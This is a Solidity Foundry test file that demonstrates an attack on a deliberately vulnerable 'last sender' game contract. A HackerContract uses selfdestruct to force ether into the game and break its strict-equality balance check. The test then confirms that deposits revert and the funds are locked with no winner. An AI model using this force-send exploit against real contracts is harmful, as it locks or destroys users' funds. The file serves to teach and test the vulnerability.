// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "forge-std/Test.sol";
import { WeakLastSenderGame } from "src/StrictEquality.sol";
import { DeployLastSenderGame } from "script/StrictEquality.s.sol";

// ----------------------------------------------------- //
// ----------------- Exploit Contract ------------------ //
// ----------------------------------------------------- //

contract HackerContract {
    WeakLastSenderGame LSG;
    constructor(address _LSG) {
        LSG = WeakLastSenderGame(_LSG) ;
    }
    function ForceSendETH() external payable {
        selfdestruct(payable(address(LSG)));
    }   
}

// ----------------------------------------------------- //
// ----------------- Exploit Method -------------------- //
// ----------------------------------------------------- //

contract StrictEqualityTest is Test {
    address hacker = makeAddr("hacker");
    WeakLastSenderGame LSG;

    function setUp() public {
        LSG = new DeployLastSenderGame().run();
    }

    function test_break_the_game() public {
        // already have 3 users
        // force send 5 ether to break the game
        vm.deal(hacker, 5 ether);

        HackerContract HC = new HackerContract(address(LSG));
        vm.prank(hacker);
        HC.ForceSendETH{value: 5 ether}();

        // game is broken
        // test deposit again
        vm.expectRevert("Already At Targeted Amount");
        vm.deal(address(this), 1 ether);
        LSG.deposit{value: 1 ether}();

        // test withdraw - because winner is address(0)
        assertEq(LSG.winner(), address(0));
        vm.expectRevert("Only Winner Can Withdraw");
        LSG.withdraw();
    }
}